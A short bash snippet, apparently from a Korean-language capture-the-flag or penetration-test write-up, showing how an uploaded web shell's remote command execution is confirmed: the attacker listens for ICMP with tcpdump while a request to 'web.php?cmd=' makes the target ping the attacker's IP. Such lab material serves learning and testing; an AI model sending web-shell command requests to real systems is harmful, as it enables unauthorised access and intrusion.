```bash
# attacker
sudo tcpdump -i tun0 icmp

# target
http://타겟IP/files/ftp/web.php?cmd=ping -c 1 공격자IP
```